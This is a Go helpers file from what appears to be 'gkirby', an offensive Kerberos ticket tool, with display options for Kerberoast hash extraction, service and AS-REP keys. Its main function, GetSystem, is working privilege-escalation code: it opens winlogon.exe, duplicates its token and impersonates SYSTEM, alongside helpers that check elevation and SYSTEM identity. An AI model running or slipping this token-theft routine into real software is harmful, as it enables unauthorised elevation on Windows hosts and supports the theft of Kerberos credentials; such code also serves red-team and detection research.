package helpers

import (
	"fmt"
	"time"
	"unsafe"

	"github.com/ziggoon/gkirby/dll"
	"golang.org/x/sys/windows"
)

const (
	windowsToUnixEpochIntervals = 116444736000000000
)

const (
	ProcessQueryInformation = 0x0400
	ProcessVmRead           = 0x0010
)

type DisplayOptions struct {
	IndentLevel           int
	DisplayTGT            bool
	DisplayB64Ticket      bool
	ExtractKerberoastHash bool
	NoWrap                bool
	ServiceKey            []byte
	AsrepKey              []byte
	ServiceUser           string
	ServiceDomain         string
	KrbKey                []byte
	KeyList               []byte
	DesPlainText          string
}

type TicketDisplayFormat int

const (
	Triage TicketDisplayFormat = iota
	Klist
	Full
)

func DefaultDisplayOptions() *DisplayOptions {
	return &DisplayOptions{
		IndentLevel:           2,
		DisplayTGT:            false,
		DisplayB64Ticket:      false,
		ExtractKerberoastHash: true,
		NoWrap:                false,
	}
}

func GetSystem() bool {
	isHighIntegrity := IsHighIntegrity()
	if !isHighIntegrity {
		fmt.Println("Not running with high integrity")
		return false
	}

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		fmt.Printf("CreateToolhelp32Snapshot failed: %v\n", err)
		return false
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))
	if err := windows.Process32First(snapshot, &procEntry); err != nil {
		fmt.Printf("Process32First failed: %v\n", err)
		return false
	}

	for {
		processName := windows.UTF16ToString(procEntry.ExeFile[:])
		if processName == "winlogon.exe" {
			handle, err := windows.OpenProcess(
				ProcessQueryInformation|ProcessVmRead,
				false,
				procEntry.ProcessID,
			)
			if err != nil {
				fmt.Printf("OpenProcess failed: %v\n", err)
				return false
			}
			defer windows.CloseHandle(handle)

			fmt.Printf("winlogon handle obtained\n")

			var token windows.Token
			err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
			if err != nil {
				fmt.Printf("OpenProcessToken failed: %v\n", err)
				return false
			}
			defer token.Close()

			fmt.Printf("token obtained: %v\n", token)

			var duplicateToken windows.Token
			err = windows.DuplicateTokenEx(
				token,
				windows.MAXIMUM_ALLOWED,
				nil,
				windows.SecurityImpersonation,
				windows.TokenImpersonation,
				&duplicateToken,
			)
			if err != nil {
				fmt.Printf("DuplicateTokenEx failed: %v\n", err)
				return false
			}
			defer duplicateToken.Close()

			ret, _, errNo := dll.ImpersonateLoggedOnUser.Call(uintptr(duplicateToken))
			if ret == 0 {
				fmt.Printf("ImpersonateLoggedOnUser failed with error: %v\n", errNo)
				return false
			}

			// Verify impersonation worked
			isSystem := IsSystem()
			if !isSystem {
				fmt.Println("Impersonation failed - not running as SYSTEM")
				return false
			}

			fmt.Println("Successfully impersonated SYSTEM")
			return true
		}

		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				break
			}
			fmt.Printf("Process32Next failed: %v\n", err)
			return false
		}
	}

	fmt.Println("Failed to find winlogon.exe")
	return false
}

func IsSystem() bool {
	var token windows.Token
	procHandle := windows.CurrentProcess()
	err := windows.OpenProcessToken(procHandle, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	user, err := token.GetTokenUser()
	if err != nil {
		return false
	}

	systemSid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err != nil {
		return false
	}

	fmt.Printf("systemSid: %v\n", systemSid)
	fmt.Printf("user sid: %v\n", user.User.Sid)
	fmt.Printf("equal?: %v\n", windows.EqualSid(user.User.Sid, systemSid))

	return windows.EqualSid(user.User.Sid, systemSid)
}

func IsHighIntegrity() bool {
	var token windows.Token
	h := windows.CurrentProcess()
	err := windows.OpenProcessToken(h, windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()

	var isElevated uint32
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenElevation, (*byte)(unsafe.Pointer(&isElevated)), uint32(unsafe.Sizeof(isElevated)), &returnedLen)
	if err != nil {
		return false
	}

	return isElevated != 0
}

func FileTimeToTime(fileTime int64) time.Time {
	nsec := (fileTime - windowsToUnixEpochIntervals) * 100
	return time.Unix(0, nsec).Local()
}
